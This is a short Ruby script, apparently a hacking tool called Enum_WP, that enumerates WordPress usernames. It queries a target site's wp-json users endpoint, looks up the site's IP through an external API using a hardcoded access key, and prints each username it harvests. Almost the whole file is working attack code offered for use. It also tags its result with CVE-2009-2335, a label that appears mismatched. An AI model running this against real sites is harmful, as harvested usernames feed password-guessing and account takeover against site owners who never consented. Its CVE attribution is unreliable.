require "open-uri"
require "json"
require "colorize"


class Design

	def Ascii
		ascii = open("http://artii.herokuapp.com/make?text=Enum_WP").read
		return ascii


	end

	def Copy

		puts "Dev By Ruby".red
		puts "Script: Enum_WP".yellow


	end

	def IP(domain)
		open("http://api.ipapi.com/api/#{domain}?access_key=bb62f0f3b361b3c946b1ae1f9821ce8d&hostname=1").read
		


	end



end

class API

	attr_accessor :uri


	def initialize(uri)
		@uri = uri


	end

	def apiRequest

		open("http://#{uri}/wp-json/wp/v2/users/")

	end

	def apiReq
		open("http://#{uri}/wp-json/wp/v2/users/").read

	end

	def decompressJson(req)
		JSON.parse(req)



	end




end

if ARGV.length == 2
	if(ARGV[0] == "-l")

		designn = Design.new()

		puts designn.Ascii.green
		puts ""

		puts designn.Copy
		sleep(2)
		puts ""

		target = ARGV[1].green
		puts "Target -> #{target}"

		hash = JSON.parse(designn.IP(ARGV[1]))
		ip = hash
		sleep(2)
		puts "IP -> #{ip["ip"].green}"

		
		begin 
			api = API.new(ARGV[1])
			status = api.apiRequest
			if status.status == ["200", "OK"]
				cve = "CVE-2009-2335".yellow
				puts "Vulnerability: #{cve}"
				puts ""
				puts "Result:"
				sleep(3)
				hasher = api.decompressJson(api.apiReq)

				hasher.each do |infos|

					puts "=====Informations=====".green
					puts "Username: #{infos["name"]}"
					puts "======================".green

				end
				
				

			else
				puts ""
				puts "Target Not Vulnerable".red

			end

		rescue OpenURI::HTTPError
			puts ""
			puts "Target Not Vulnerable".red

		end	


	else
		puts "USAGE: EnumeWP.rb -l site.com".red

	end

		


else
	puts "USAGE: EnumeWP.rb -l site.com".red

end

#bye :)